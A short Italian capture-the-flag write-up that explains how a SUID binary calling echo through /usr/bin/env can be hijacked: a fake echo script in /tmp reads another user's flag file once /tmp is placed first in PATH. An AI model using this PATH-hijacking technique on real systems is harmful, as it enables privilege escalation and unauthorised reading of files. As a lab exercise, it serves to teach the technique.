system("/usr/bin/env echo and now what?");

- Il programma utilizza /usr/bin/env per eseguire il comando echo.
- env cerca il comando echo nel PATH.
- Il binario flag01 ha il **bit SUID impostato**, il che significa che il programma viene eseguito con i privilegi di flag00.

env cerca echo nel PATH definito. PATH è una variabile d’ambiente che contiene una lista di directory in cui cercare i comandi eseguibili.

**Se noi modifichiamo il PATH e lo impostiamo in modo che la nostra directory /tmp sia cercata prima delle directory di sistema**, possiamo far sì che il nostro script echo personalizzato venga eseguito al posto del vero /bin/echo

```java
cd /tmp
echo -e '#!/bin/bash\ncat /home/flag00/flag.txt' > echo
chmod +x echo
```

Questo script esegue il comando cat /home/flag00/flag.txt.

export PATH=/tmp:$PATH